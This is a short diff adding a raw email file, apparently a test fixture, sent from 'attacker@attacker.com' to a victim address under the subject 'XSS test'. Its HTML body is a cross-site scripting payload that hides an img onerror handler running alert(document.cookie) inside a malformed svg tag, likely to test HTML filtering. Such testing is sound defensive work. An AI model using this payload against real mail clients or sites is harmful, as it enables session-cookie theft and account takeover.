@@ -1,0 +1,7 @@
+From: <attacker@attacker.com>
+Subject: XSS test
+To: victim@sohu.com
+MIME-Version: 1.0
+Content-type: text/html
+
+<svg:><img onerror="alert(document.cookie)" src="x"></svg:>
